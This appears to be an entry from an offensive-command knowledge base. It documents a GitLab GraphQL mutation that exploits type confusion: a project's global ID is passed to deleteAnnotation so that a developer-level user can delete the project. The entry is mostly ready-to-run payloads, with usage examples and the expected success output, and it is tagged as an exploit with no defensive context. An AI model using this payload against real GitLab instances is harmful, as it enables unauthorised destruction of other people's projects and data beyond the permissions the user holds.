---
data: >-
  mutation { deleteAnnotation(input: {id: "gid://GitLab/Project/<project-id>"})
  { clientMutationId } }
tags:
  - graphql
  - exploit
type: command
output: '{"data":{"deleteAnnotation":{"clientMutationId":null}}}'
executor: graphql
platforms:
  - Web
  - GitLab
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:29:20.434Z'
id: 14ede5e4-6536-4ba1-aaf3-df6423d94309
verified: false
validated: true
submitted: true
---
# deleteAnnotation-Project-Mutation

## Command

```graphql
mutation { deleteAnnotation(input: {id: "gid://GitLab/Project/<project-id>"}) { clientMutationId } }
```

## Description

GraphQL mutation exploiting type confusion in GitLab to delete a project by passing its global ID instead of an annotation ID. Use in GraphQL Explorer by a developer user.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| input.id | Global ID of the project (gid://GitLab/Project/<project-id>) | Yes |

## Examples

### Basic Usage

```graphql
mutation { deleteAnnotation(input: {id: "gid://GitLab/Project/123"}) { clientMutationId } }
```

### Advanced Usage

Include clientMutationId for tracking:

```graphql
mutation { deleteAnnotation(input: {id: "gid://GitLab/Project/123", clientMutationId: "abc123"}) { clientMutationId errors } }
```

## Expected Output

Successful response indicating deletion: {"data":{"deleteAnnotation":{"clientMutationId":null}}}, with project removed.

## Related

- [[commands/deleteAnnotation-Group-Mutation]]
- [[procedures/Execute-deleteAnnotation-Mutation-on-Project]]
